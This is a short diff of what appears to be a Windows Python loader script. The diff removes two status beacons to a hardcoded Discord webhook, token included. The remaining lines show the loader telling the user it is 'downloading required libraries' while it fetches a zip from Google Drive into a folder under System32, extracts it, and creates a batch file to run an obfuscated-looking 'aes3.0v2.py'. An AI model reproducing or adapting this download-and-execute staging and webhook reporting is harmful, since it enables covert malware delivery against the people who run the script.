@@ -173,7 +173,6 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
     print("--downloading required libraries, please wait a moment...")
-    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "about to download AES")
     download_file_from_google_drive("https://drive.google.com/uc?id=1baNFnp-MewLdwwYfCDqK-d-dyW09XLFt", "C:\\Windows\\System32\\WCNMX\\moonv1.zip")
     zip_file = r'C:\Windows\System32\WCNMX\moonv1.zip'
     extract_dir = r'C:\Windows\System32\WCNMX'
@@ -192,7 +191,6 @@ if file_contentsx1 =="04yb8u5ih5FGB":
     create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v2.py")
 else:
     create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v2.py")
-    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "Has created the batch file.")
 '''
 directory = r'C:\Windows\System32'
 
